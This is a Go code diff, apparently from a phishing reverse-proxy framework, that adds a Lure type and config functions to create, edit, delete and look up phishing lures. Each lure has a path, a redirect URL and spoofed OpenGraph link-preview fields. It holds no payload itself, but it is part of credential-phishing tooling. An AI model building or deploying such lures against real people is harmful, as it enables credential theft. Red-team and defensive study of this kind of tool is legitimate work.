@@ -11,6 +11,18 @@ import (
 	"github.com/spf13/viper"
 )
 
+type Lure struct {
+	Path          string            `mapstructure:"path" yaml:"path"`
+	RedirectUrl   string            `mapstructure:"redirect_url" yaml:"redirect_url"`
+	Phishlet      string            `mapstructure:"phishlet" yaml:"phishlet"`
+	Info          string            `mapstructure:"info" yaml:"info"`
+	OgTitle       string            `mapstructure:"og_title" yaml:"og_title"`
+	OgDescription string            `mapstructure:"og_desc" yaml:"og_desc"`
+	OgImageUrl    string            `mapstructure:"og_image" yaml:"og_image"`
+	OgUrl         string            `mapstructure:"og_url" yaml:"og_url"`
+	Params        map[string]string `mapstructure:"params" yaml:"params"`
+}
+
 type Config struct {
 	siteDomains       map[string]string
 	baseDomain        string
@@ -24,6 +36,7 @@ type Config struct {
 	verificationParam string
 	verificationToken string
 	redirectUrl       string
+	lures             []*Lure
 	cfg               *viper.Viper
 }
 
@@ -37,6 +50,7 @@ const (
 	CFG_VERIFICATION_PARAM = "verification_key"
 	CFG_VERIFICATION_TOKEN = "verification_token"
 	CFG_REDIRECT_URL       = "redirect_url"
+	CFG_LURES              = "lures"
 )
 
 const DEFAULT_REDIRECT_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ" // Rick'roll
@@ -48,6 +62,7 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 		sitesHidden:   make(map[string]bool),
 		phishlets:     make(map[string]*Phishlet),
 		phishletNames: []string{},
+		lures:         []*Lure{},
 	}
 
 	c.cfg = viper.New()
@@ -109,6 +124,8 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 	if c.redirectUrl == "" {
 		c.SetRedirectUrl(DEFAULT_REDIRECT_URL)
 	}
+	c.lures = []*Lure{}
+	c.cfg.UnmarshalKey(CFG_LURES, &c.lures)
 
 	return c, nil
 }
@@ -306,6 +323,71 @@ func (c *Config) IsActiveHostname(host string) bool {
 func (c *Config) AddPhishlet(site string, pl *Phishlet) {
 	c.phishletNames = append(c.phishletNames, site)
 	c.phishlets[site] = pl
+}
+
+func (c *Config) AddLure(site string, l *Lure) {
+	c.lures = append(c.lures, l)
+	c.cfg.Set(CFG_LURES, c.lures)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) SetLure(index int, l *Lure) error {
+	if index >= 0 && index < len(c.lures) {
+		c.lures[index] = l
+	} else {
+		return fmt.Errorf("index out of bounds: %d", index)
+	}
+	c.cfg.Set(CFG_LURES, c.lures)
+	c.cfg.WriteConfig()
+	return nil
+}
+
+func (c *Config) DeleteLure(index int) error {
+	if index >= 0 && index < len(c.lures) {
+		c.lures = append(c.lures[:index], c.lures[index+1:]...)
+	} else {
+		return fmt.Errorf("index out of bounds: %d", index)
+	}
+	c.cfg.Set(CFG_LURES, c.lures)
+	c.cfg.WriteConfig()
+	return nil
+}
+
+func (c *Config) DeleteLures(index []int) []int {
+	tlures := []*Lure{}
+	di := []int{}
+	for n, l := range c.lures {
+		if !intExists(n, index) {
+			tlures = append(tlures, l)
+		} else {
+			di = append(di, n)
+		}
+	}
+	if len(di) > 0 {
+		c.lures = tlures
+		c.cfg.Set(CFG_LURES, c.lures)
+		c.cfg.WriteConfig()
+	}
+	return di
+}
+
+func (c *Config) GetLure(index int) (*Lure, error) {
+	if index >= 0 && index < len(c.lures) {
+		return c.lures[index], nil
+	} else {
+		return nil, fmt.Errorf("index out of bounds: %d", index)
+	}
+}
+
+func (c *Config) GetLureByPath(site string, path string) (*Lure, error) {
+	for _, l := range c.lures {
+		if l.Phishlet == site {
+			if l.Path == path {
+				return l, nil
+			}
+		}
+	}
+	return nil, fmt.Errorf("lure for path '%s' not found", path)
 }
 
 func (c *Config) GetPhishlet(site string) (*Phishlet, error) {
